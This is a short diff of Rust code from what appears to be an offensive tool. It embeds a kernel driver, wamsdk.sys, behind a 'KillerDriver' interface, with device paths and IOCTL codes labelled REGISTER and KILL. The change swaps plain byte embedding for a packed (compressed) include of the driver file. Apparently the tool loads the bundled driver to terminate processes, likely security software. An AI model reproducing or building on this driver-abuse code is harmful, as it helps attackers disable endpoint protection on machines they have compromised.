@@ -1,4 +1,5 @@
 use std::{mem, ptr::null_mut};
+use include_packed::include_packed;
 
 use winapi::{
     ctypes::c_void, shared::minwindef::{DWORD, LPVOID}, um::{
@@ -19,8 +20,6 @@ const DRIVER_DEVICE: &str = "\\\\.\\amsdk";
 const DRIVER_GUARD_DEVICE: &str = "\\\\.\\B5A6B7C9-1E31-4E62-91CB-6078ED1E9A4F";
 const IOCTL_REGISTER: u32 = 0x80002010;
 const IOCTL_KILL: u32 = 0x80002048;
-
-static DRIVER: &'static [u8] = include_bytes!("../../../drivers/wamsdk.sys");
 
 #[repr(C, packed)]
 struct payload {
@@ -135,7 +134,7 @@ impl KillerDriver for Wamsdk {
     }
 
     fn get_file(&self) -> Result<Vec<u8>, crate::utils::error::SigurdError> {
-        let v = DRIVER.to_vec();
+        let v = include_packed!("drivers/wamsdk.sys");
         return Ok(v);
     }
 
